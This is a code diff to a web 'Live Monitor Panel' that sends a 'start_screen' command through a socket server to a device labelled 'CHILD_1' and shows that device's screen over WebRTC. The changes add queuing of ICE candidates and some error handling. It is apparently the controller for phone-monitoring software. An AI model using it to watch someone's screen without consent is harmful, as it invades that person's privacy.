@@ -70,7 +70,7 @@
         video {
             width: 100%;
             height: 100%;
-            object-fit: contain; /* Pura screen dikhega */
+            object-fit: contain;
         }
 
         .status {
@@ -98,7 +98,7 @@
     <h1>🕵️‍♂️ Live Monitor Panel</h1>
 
     <div class="control-panel">
-        <input type="text" id="deviceId" value="278964" placeholder="Enter Device ID">
+        <input type="text" id="deviceId" value="CHILD_1" placeholder="Enter Device ID">
         <button onclick="startScreen()">▶ Start Stream</button>
     </div>
 
@@ -112,6 +112,8 @@
     <script>
         const socket = io("https://child-v9no.onrender.com");
         let pc;
+        let candidateQueue = []; // 🔥 Queue for ICE Candidates
+        
         const statusLabel = document.getElementById("connectionStatus");
         const loadingText = document.getElementById("loadingText");
 
@@ -121,7 +123,6 @@
             statusLabel.classList.add("connected");
             statusLabel.classList.remove("disconnected");
             
-            // Admin room join kar raha hai
             socket.emit("join-room", "ADMIN");
         });
 
@@ -133,29 +134,40 @@
 
         function getTargetRoom() {
             const id = document.getElementById("deviceId").value;
-            return id + "_screen"; // E.g., 278964_screen
+            return id + "_screen"; 
         }
 
-        // 1. Start Button Logic
         function startScreen() {
             const roomName = getTargetRoom();
             console.log("🚀 Sending START command to:", roomName);
             statusLabel.innerText = "⏳ Requesting Screen Share...";
             
+            // Clean up old connection if exists
+            if (pc) {
+                pc.close();
+                pc = null;
+            }
+            candidateQueue = []; // Reset queue
+
             socket.emit("send-command", {
                 targetId: roomName, 
                 command: "start_screen"
             });
         }
 
-        // 2. Offer Receive & Auto-Answer Logic
+        // 🔥 OFFER RECEIVED (With Queue Processing)
         socket.on("offer", async (data) => {
             console.log("📡 Offer Received! Processing...");
             statusLabel.innerText = "⚡ Connecting to Device...";
-            loadingText.style.display = "none"; // Hide text
+            loadingText.style.display = "none";
 
+            // 1. Setup Peer Connection (Same Google Servers as Android)
             pc = new RTCPeerConnection({
-                iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
+                iceServers: [
+                    { urls: "stun:stun.l.google.com:19302" },
+                    { urls: "stun:stun1.l.google.com:19302" },
+                    { urls: "stun:stun2.l.google.com:19302" }
+                ]
             });
 
             pc.ontrack = (event) => {
@@ -175,30 +187,61 @@
                     });
                 }
             };
-
-            // Set Remote Description (Offer from Mobile)
-            await pc.setRemoteDescription(new RTCSessionDescription({ type: "offer", sdp: data.sdp }));
-
-            // Create Answer
-            const answer = await pc.createAnswer();
-            await pc.setLocalDescription(answer);
-
-            console.log("📤 Sending ANSWER back to mobile...");
             
-            // 🔥 YAHAN ANSWER BHEJA JA RAHA HAI
-            socket.emit("answer", {
-                target: getTargetRoom(),
-                sdp: answer.sdp
-            });
+            pc.oniceconnectionstatechange = () => {
+                console.log("❄️ ICE State:", pc.iceConnectionState);
+                if(pc.iceConnectionState === "disconnected") {
+                    statusLabel.innerText = "⚠️ Stream Disconnected";
+                }
+            };
+
+            // 2. Set Remote Description (Wait for it)
+            try {
+                await pc.setRemoteDescription(new RTCSessionDescription({ type: "offer", sdp: data.sdp }));
+                console.log("✅ Remote Description Set");
+
+                // 3. 🔥 Process Queued Candidates (Jo pehle aa gaye the)
+                while (candidateQueue.length > 0) {
+                    const candidate = candidateQueue.shift();
+                    await pc.addIceCandidate(candidate);
+                    console.log("📥 Added Queued Candidate");
+                }
+
+                // 4. Create Answer
+                const answer = await pc.createAnswer();
+                await pc.setLocalDescription(answer);
+
+                console.log("📤 Sending ANSWER back to mobile...");
+                socket.emit("answer", {
+                    target: getTargetRoom(),
+                    sdp: answer.sdp
+                });
+
+            } catch (err) {
+                console.error("❌ Error processing offer:", err);
+            }
         });
 
-        socket.on("candidate", (data) => {
-            if (pc) {
-                pc.addIceCandidate(new RTCIceCandidate({
+        // 🔥 CANDIDATE HANDLER (With Queue Check)
+        socket.on("candidate", async (data) => {
+            try {
+                const candidate = new RTCIceCandidate({
                     candidate: data.candidate,
                     sdpMid: data.sdpMid,
                     sdpMLineIndex: data.sdpMLineIndex
-                }));
+                });
+
+                if (pc && pc.remoteDescription && pc.remoteDescription.type) {
+                    // Agar sab ready hai, seedha add karo
+                    await pc.addIceCandidate(candidate);
+                    console.log("➕ Added ICE Candidate directly");
+                } else {
+                    // Agar ready nahi hai, queue mein daalo
+                    console.log("⏳ Queueing Candidate (Waiting for Offer)");
+                    candidateQueue.push(candidate);
+                }
+            } catch (e) {
+                console.error("Error adding candidate", e);
             }
         });
 
